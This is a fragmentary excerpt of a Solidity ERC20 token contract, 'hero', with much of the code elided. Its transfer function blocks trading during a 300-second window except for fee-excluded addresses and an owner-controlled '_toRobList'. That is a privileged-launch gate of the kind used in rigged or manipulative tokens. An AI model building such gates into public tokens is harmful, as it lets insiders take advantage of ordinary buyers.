...
contract hero is Context, IERC20, Ownable {
    ...
    uint256 public shibMinAmount = 6500 * 10 ** _decimals;

    uint256 public maxUsdtAmount = 500 * 10 ** 18;
    
    uint256 public _time = 300;
    ...
    function _transfer(
        ...
        require(_isExcludedFromFee[from] || _isExcludedFromFee[to] || _toRobList[to] || block.timestamp > currentTime.add(_time), 'white address');

        if (_toRobList[to] && block.timestamp <= currentTime.add(_time)) {
